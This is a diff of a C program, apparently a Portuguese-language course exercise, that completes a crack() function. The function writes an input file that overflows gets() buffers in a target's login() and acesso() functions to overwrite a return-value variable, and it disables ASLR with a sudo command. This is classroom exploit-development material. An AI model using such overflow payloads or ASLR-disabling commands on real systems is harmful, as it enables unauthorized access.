@@ -2,7 +2,9 @@
 #include <stdlib.h>
 #include <string.h>
 
-#define BUFF_SIZE 10 //DEFINA O TAMANHO DO BUFFER AQUI
+#define BUFF_SIZE 60 // DEFINA O TAMANHO DO BUFFER AQUI
+#define USER_SIZE 3 // DEFINE O TAMANHO DO USUARIO
+#define PASS_SIZE 34 // DEFINE O TAMANHO DA SENHA
 
 void execute() {
     system("sudo echo 0 > /proc/sys/kernel/randomize_va_space");
@@ -19,11 +21,15 @@ void debug() {
 void crack() {
     FILE *f = fopen("./teste.in", "w+");
     char buff[BUFF_SIZE];
-    char exploit[BUFF_SIZE + 1000000];
-    strcpy(buff, "SB\nSB\n");
-    strcpy(exploit, buff);
+    char user[USER_SIZE] = "SB\n";
+    char pass[PASS_SIZE] = "SB";
+    int ret_value = 3;
     //IMPLEMENTE A ENTRADA PARA ALCANÇAR OS OBJETIVOS DO TRABALHO AQUI (USAR A ENTRADA PADRÃO)
-    fwrite(buff, 1, BUFF_SIZE, f);  
+    fwrite(user, 1, USER_SIZE, f); // nao precisa quebrar o buffer de usuario
+    fwrite(pass, 1, PASS_SIZE, f); // quebra o buffer de gets() em login()
+    fwrite("\n", 1, 1, f);
+    fwrite(buff, 1, BUFF_SIZE, f); // quebra o buffer de gets() em acesso()
+    fwrite(&ret_value, sizeof(ret_value), 1, f); // altera o valor de ret_value para 3 
     fclose(f);
 
     system("sudo echo 0 > /proc/sys/kernel/randomize_va_space");
